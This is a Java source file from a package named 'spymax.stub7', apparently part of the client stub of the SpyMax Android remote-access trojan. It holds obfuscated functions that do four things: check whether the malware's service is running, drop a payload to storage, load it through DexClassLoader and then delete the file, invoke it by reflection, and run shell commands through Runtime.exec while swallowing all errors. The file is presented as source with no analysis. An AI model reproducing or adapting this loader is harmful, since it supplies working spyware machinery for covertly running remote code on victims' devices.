package spymax.stub7;
import android.app.ActivityManager;
import android.content.Context;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;
public class ClassGen10 {
    public static int id = 0 ;
    public static boolean r(Class<?> c, Context ctx) {
        ActivityManager a = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo i : a.getRunningServices(Integer.MAX_VALUE)) {
            if (c.getName().equals(i.service.getClassName())) {
                return false;
            }
        }
        return true;
    }
    public static File i(Context ctx){
        if (Environment.getExternalStorageState() == null) {
            return new File(Environment.getDataDirectory(),ctx.getResources().getString(R.string.i1i2i3i4i5i6));
        }else{
            return new File(Environment.getExternalStorageDirectory(),ctx.getResources().getString(R.string.i1i2i3i4i5i6));
        }
    }
    public static synchronized Class<?> sl(Context ctx, byte[]pl, String m, String dx){
        File f = i(ctx);
        if(!f.exists()){
            f.mkdir();
        }
        File p;
        try{
            p = new File(f, ctx.getResources().getString(R.string.u1u2u3u4u5u6) + ClassGen10.id);
            ClassGen10.id += 1;
            FileOutputStream fs = new FileOutputStream(p);
            fs.write(pl,0,pl.length);
            fs.flush();
            fs.close();
        }catch (Exception e){
            p = null;
        }
        try {
            if (p != null){
                final File i = ctx.getDir(dx, 0);
                final DexClassLoader c = new DexClassLoader(p.getPath(), i.getAbsolutePath(), null, ctx.getClass().getClassLoader());
                p.delete();
                return c.loadClass(m);
            }
        } catch (Exception e) {
        }
        return null;
    }
    public static Object exec(Context ctx, Class<?> cla , String met , String s, byte[] b){
        Object r = null;
        if(cla != null)
        {
            try {
                Object pl =  cla.newInstance();
                Method m = cla.getDeclaredMethod(met, Context.class, String.class, byte[].class);
                r = m.invoke(pl,ctx,s,b);
            } catch (Exception e) {}
        }
        return r;
    }
    public static void d(Context ctx , String co){
        File f = i(ctx);
        if (f.isDirectory()) {
            try {
                Runtime ru = Runtime.getRuntime();
                ru.exec(co + f.getPath());
            } catch (Exception e) {}
        }

    }

}
